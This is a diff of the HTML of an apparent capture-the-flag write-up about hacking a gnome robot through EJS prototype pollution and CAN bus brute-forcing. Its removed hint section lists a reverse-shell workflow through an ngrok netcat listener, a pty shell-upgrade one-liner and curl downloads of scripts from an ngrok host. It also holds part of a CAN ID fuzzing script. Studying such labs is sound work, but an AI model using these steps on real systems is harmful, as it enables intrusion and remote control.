-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>,         <span style="color:#75715e"># empty</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x01</span><span style="color:#e6db74">&#34;</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xFF</span><span style="color:#e6db74">&#34;</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00</span><span style="color:#e6db74">&#34;</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x14\x14</span><span style="color:#e6db74">&#34;</span>, <span style="color:#75715e"># +20,+20</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xEC\xEC</span><span style="color:#e6db74">&#34;</span>, <span style="color:#75715e"># -20,-20</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xEC\x14</span><span style="color:#e6db74">&#34;</span>, <span style="color:#75715e"># left -, right +</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x14\xEC</span><span style="color:#e6db74">&#34;</span>, <span style="color:#75715e"># left +, right -</span>
-</span></span><span style="display:flex;"><span>    ]
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Scanning standard IDs 0x</span><span style="color:#e6db74">{</span>SCAN_START<span style="color:#e6db74">:</span><span style="color:#e6db74">03X</span><span style="color:#e6db74">}</span><span style="color:#e6db74">-0x</span><span style="color:#e6db74">{</span>SCAN_END<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">:</span><span style="color:#e6db74">03X</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> ...&#34;</span>)
-</span></span><span style="display:flex;"><span>    hits <span style="color:#f92672">=</span> scan(
-</span></span><span style="display:flex;"><span>        bus,
-</span></span><span style="display:flex;"><span>        start<span style="color:#f92672">=</span>SCAN_START,
-</span></span><span style="display:flex;"><span>        end<span style="color:#f92672">=</span>SCAN_END,
-</span></span><span style="display:flex;"><span>        payloads<span style="color:#f92672">=</span>payloads,
-</span></span><span style="display:flex;"><span>        extended<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
-</span></span><span style="display:flex;"><span>        rate_sleep<span style="color:#f92672">=</span><span style="color:#ae81ff">0.03</span>,
-</span></span><span style="display:flex;"><span>        verbose_every<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>,   <span style="color:#75715e"># set to e.g. 10 if too chatty</span>
-</span></span><span style="display:flex;"><span>    )
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Done. Hits: </span><span style="color:#e6db74">{</span>len(hits)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> arb_id, data, before, after <span style="color:#f92672">in</span> hits[:<span style="color:#ae81ff">50</span>]:
-</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;  0x</span><span style="color:#e6db74">{</span>arb_id<span style="color:#e6db74">:</span><span style="color:#e6db74">03X</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span>data<span style="color:#f92672">.</span>hex() <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;(empty)&#39;</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span>before<span style="color:#e6db74">}</span><span style="color:#e6db74">-&gt;</span><span style="color:#e6db74">{</span>after<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    bus<span style="color:#f92672">.</span>shutdown()
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
-</span></span><span style="display:flex;"><span>    main()</span></span></code></pre></div>
-<p>After toying with the input to the Python script on the server, we finally mapped the new HEX values like this:</p>
+</span></span><span style="display:flex;"><span>SCAN_END   <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x206</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span></span></span></code></pre></div>
+<hr>
+<h3 id="final-control-mapping-and-solution">Final control mapping and solution</h3>
+<p>After testing, I identified the following CAN bus mappings:</p>
 <table>
   <thead>
       <tr>
           <th>Button</th>
-          <th>Canbus command id</th>
-          <th>New Value</th>
+          <th>Original ID</th>
+          <th>Correct ID</th>
       </tr>
   </thead>
   <tbody>
@@ -791,29 +588,17 @@ flowchart LR
       </tr>
   </tbody>
 </table>
-<p>We grabbed the Python script from the server to our attacking machine, edited it according to the mapping and reuploaded it under a new name (<em>cb.py</em>). This enabled us to navigate our robot through the maze using this command and directions:</p>
+<p>After updating the script, I was able to navigate the robot through the maze and complete the objective:</p>
 <div class="highlight wrap-code" dir="auto"><pre tabindex="0"><code>python3 cb.py &lt;direction&gt;</code></pre></div>
-<p>Leading us to solving the objective:</p>
-<p><a href="#R-image-21c8efb368f7edd5d752179bbec5f72d" class="lightbox-link"><img alt="Final screen" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-5.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-21c8efb368f7edd5d752179bbec5f72d"><img alt="Final screen" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-5.png"></a></p>
-<h2 id="resources">Resources</h2>
-<p>This objective required extensive reading up on the whole <code>__proto__</code> attack vector. We found these resources of great value for our research:</p>
-<ul>
-<li><a href="https://security.snyk.io/vuln/SNYK-JS-EJS-2803307" rel="external">https://security.snyk.io/vuln/SNYK-JS-EJS-2803307</a></li>
-<li><a href="https://blog.themikkel.dk/ddc-regionale-2025-writeup/" rel="external">https://blog.themikkel.dk/ddc-regionale-2025-writeup/</a></li>
-<li><a href="https://blog.huli.tw/2023/06/22/en/ejs-render-vulnerability-ctf/" rel="external">https://blog.huli.tw/2023/06/22/en/ejs-render-vulnerability-ctf/</a></li>
-<li><a href="https://www.nodejs-security.com/blog/understanding-and-preventing-prototype-pollution-in-nodejs" rel="external">https://www.nodejs-security.com/blog/understanding-and-preventing-prototype-pollution-in-nodejs</a></li>
-<li><a href="https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce" rel="external">https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce</a></li>
-<li><a href="https://dev.to/boiledsteak/simple-remote-code-execution-on-ejs-web-applications-with-express-fileupload-3325" rel="external">https://dev.to/boiledsteak/simple-remote-code-execution-on-ejs-web-applications-with-express-fileupload-3325</a></li>
-<li><a href="https://medium.com/@albertoc_91016/prototype-pollution-in-open-source-libraries-exploiting-rce-in-ejs-ae93016630a3" rel="external">https://medium.com/@albertoc_91016/prototype-pollution-in-open-source-libraries-exploiting-rce-in-ejs-ae93016630a3</a></li>
-<li><a href="https://ejs.co/#docs" rel="external">https://ejs.co/#docs</a></li>
-</ul>
+<p><a href="#R-image-c95346bd850a1d335cb9813bd30ece45" class="lightbox-link"><img alt="Final screen" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-5.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-c95346bd850a1d335cb9813bd30ece45"><img alt="Final screen" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-5.png"></a></p>
 <h2 id="chris-davis-mission-debrief">Chris Davis mission debrief</h2>
 <blockquote>
 <p>Excellent work! You&rsquo;ve successfully taken control of the gnome - look at that interface responding to our commands now.</p>
 <p>Time to turn this little rebel against its own manufacturing operation and shut them down for good!</p>
 </blockquote>
-<h3 id="hints">Hints</h3>
+<h2 id="hints">Hints</h2>
+<p>For this objective I retrieved the followint hints:</p>
 <table>
   <thead>
       <tr>
@@ -841,36 +626,21 @@ flowchart LR
       </tr>
   </tbody>
 </table>
-<p>python3 -c &lsquo;import pty;pty.spawn(&quot;/bin/bash&quot;)&rsquo;</p>
-<p>Remember to refresh the main page for the reverse shell to work!!!</p>
-<p>NOTE: SOLVE THIS USING EDGE!!!!</p>
-<p>curl -o test.py  <a href="https://scarabaeiform-prolixly-odin.ngrok-free.dev/test.sh" rel="external">https://scarabaeiform-prolixly-odin.ngrok-free.dev/test.sh</a>
-curl -o cb.py  <a href="https://scarabaeiform-prolixly-odin.ngrok-free.dev/cb.py" rel="external">https://scarabaeiform-prolixly-odin.ngrok-free.dev/cb.py</a></p>
-<p>General workflow from start to finish:</p>
-<ol>
-<li>In the webapp, inspect all endpoint</li>
-<li>Find the endpoint where you can set data</li>
-<li>Provoke error messages to find the rendering engine (EJS)</li>
-<li>See if it is possible to set <strong>proto</strong></li>
-</ol>
-<p>Enabling shell
-5. On endpoint set client = 1
-6. On endpoint set debug = 1
-7. Set up NGROK netcat reverse
-8. Plant payload for reverse shell using the NGROK address and port
-9. Refresh main page</p>
-<p>In spawned shell:
-10. Privilege escalate using python to get a fancy bash shell
-11. Inspect canbus_client.py
-12. Inspect README.md</p>
-<p>Identifying missing HEX code
-13. Set up NGROK web frontend
-14. Spin up Python webserver
-15. Serve HEX bruteforce python script
-16. Run bruteforce script whilst observing if the robot moves</p>
+<h2 id="resources">Resources</h2>
+<p>This objective required extensive reading up on the whole <code>__proto__</code> attack vector. We found these resources of great value for our research:</p>
+<ul>
+<li><a href="https://security.snyk.io/vuln/SNYK-JS-EJS-2803307" rel="external">https://security.snyk.io/vuln/SNYK-JS-EJS-2803307</a></li>
+<li><a href="https://blog.themikkel.dk/ddc-regionale-2025-writeup/" rel="external">https://blog.themikkel.dk/ddc-regionale-2025-writeup/</a></li>
+<li><a href="https://blog.huli.tw/2023/06/22/en/ejs-render-vulnerability-ctf/" rel="external">https://blog.huli.tw/2023/06/22/en/ejs-render-vulnerability-ctf/</a></li>
+<li><a href="https://www.nodejs-security.com/blog/understanding-and-preventing-prototype-pollution-in-nodejs" rel="external">https://www.nodejs-security.com/blog/understanding-and-preventing-prototype-pollution-in-nodejs</a></li>
+<li><a href="https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce" rel="external">https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce</a></li>
+<li><a href="https://dev.to/boiledsteak/simple-remote-code-execution-on-ejs-web-applications-with-express-fileupload-3325" rel="external">https://dev.to/boiledsteak/simple-remote-code-execution-on-ejs-web-applications-with-express-fileupload-3325</a></li>
+<li><a href="https://medium.com/@albertoc_91016/prototype-pollution-in-open-source-libraries-exploiting-rce-in-ejs-ae93016630a3" rel="external">https://medium.com/@albertoc_91016/prototype-pollution-in-open-source-libraries-exploiting-rce-in-ejs-ae93016630a3</a></li>
+<li><a href="https://ejs.co/#docs" rel="external">https://ejs.co/#docs</a></li>
+</ul>
 
   <footer class="footline">
-              <i class='fa-fw fas fa-calendar'></i> Nov 30, 2025
+              <i class='fa-fw fas fa-calendar'></i> Dec 12, 2025
   </footer>
 </article>
         </div>
@@ -943,22 +713,8 @@ curl -o cb.py  <a href="https://scarabaeiform-prolixly-odin.ngrok-free.dev/cb.py
 <div id="R-footer"><p>Built with <a href="https://github.com/McShelby/hugo-theme-relearn" title="love"><i class="fas fa-heart"></i></a> by <a href="https://gohugo.io/">Hugo</a></p></div>
       </div>
     </aside>
-    <script src="/js/js-yaml/js-yaml.min.js?1765551208" defer></script>
-    <script src="/js/d3/d3-color.min.js?1765551208" defer></script>
-    <script src="/js/d3/d3-dispatch.min.js?1765551208" defer></script>
-    <script src="/js/d3/d3-drag.min.js?1765551208" defer></script>
-    <script src="/js/d3/d3-ease.min.js?1765551208" defer></script>
-    <script src="/js/d3/d3-interpolate.min.js?1765551208" defer></script>
-    <script src="/js/d3/d3-selection.min.js?1765551208" defer></script>
-    <script src="/js/d3/d3-timer.min.js?1765551208" defer></script>
-    <script src="/js/d3/d3-transition.min.js?1765551208" defer></script>
-    <script src="/js/d3/d3-zoom.min.js?1765551208" defer></script>
-    <script src="/js/mermaid/mermaid.min.js?1765551208" defer></script>
-    <script>
-      window.relearn.themeUseMermaid = JSON.parse("{}");
-    </script>
-    <script src="/js/clipboard/clipboard.min.js?1765551208" defer></script>
-    <script src="/js/perfect-scrollbar/perfect-scrollbar.min.js?1765551208" defer></script>
-    <script src="/js/theme.js?1765551208" defer></script>
+    <script src="/js/clipboard/clipboard.min.js?1765552249" defer></script>
+    <script src="/js/perfect-scrollbar/perfect-scrollbar.min.js?1765552249" defer></script>
+    <script src="/js/theme.js?1765552249" defer></script>
   </body>
 </html>
